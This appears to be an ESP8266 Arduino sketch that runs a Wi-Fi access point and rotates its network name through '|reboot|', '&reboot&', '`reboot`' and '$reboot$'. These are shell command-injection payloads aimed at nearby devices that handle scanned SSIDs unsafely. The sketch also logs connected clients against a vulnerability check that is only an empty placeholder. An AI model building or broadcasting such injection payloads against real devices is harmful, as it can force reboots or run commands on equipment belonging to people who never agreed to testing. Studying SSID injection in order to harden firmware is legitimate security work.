#include <ESP8266WiFi.h>
#include <ESP8266WiFiType.h>

const char* ssids[] = {"|reboot|", "&reboot&", "`reboot`", "$reboot$"};
const char *password = "12345678";
unsigned int ssidIndex = 0;
const int totalSSIDs = sizeof(ssids) / sizeof(ssids[0]);
unsigned long lastChangeMillis = 0;
unsigned long lastDeviceListMillis = 0;
const long ssidChangeInterval = 2 * 60 * 1000;
const long deviceListInterval = 60 * 1000;

void setup() {
  Serial.begin(115200);
  changeSSID();
}

void loop() {
  unsigned long currentMillis = millis();
  if (currentMillis - lastChangeMillis >= ssidChangeInterval) {
    lastChangeMillis = currentMillis;
    changeSSID();
  }

  if (currentMillis - lastDeviceListMillis >= deviceListInterval) {
    lastDeviceListMillis = currentMillis;
    listAndCheckConnectedDevices();
  }
}

void changeSSID() {
  const char* newSSID = ssids[ssidIndex];
  WiFi.softAP(newSSID, password);
  Serial.print("[" + String(millis()/1000) + " sec] Changed SSID to: ");
  Serial.println(newSSID);
  ssidIndex = (ssidIndex + 1) % totalSSIDs;
}

void listAndCheckConnectedDevices() {
  Serial.println("Checking Connected Devices:");
  struct station_info *station_list = wifi_softap_get_station_info();
  while (station_list != NULL) {
    String ipAddress = IPAddress((&station_list->ip)->addr).toString();
    Serial.print("IP Address: " + ipAddress);
    // Placeholder for network test
    bool isVulnerable = performNetworkTest(ipAddress);
    if (isVulnerable) {
      Serial.println(" - Device is Vulnerable.");
    } else {
      Serial.println(" - Device is Safe.");
    }
    station_list = STAILQ_NEXT(station_list, next);
  }
  wifi_softap_free_station_info();
}

bool performNetworkTest(const String& ipAddress) {
  // Placeholder for a network test function
  // This should be replaced with your actual network test logic
  return false; // Return true if vulnerable, false if safe
}

String macToString(const uint8_t* mac) {
  char buf[20];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X", 
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}
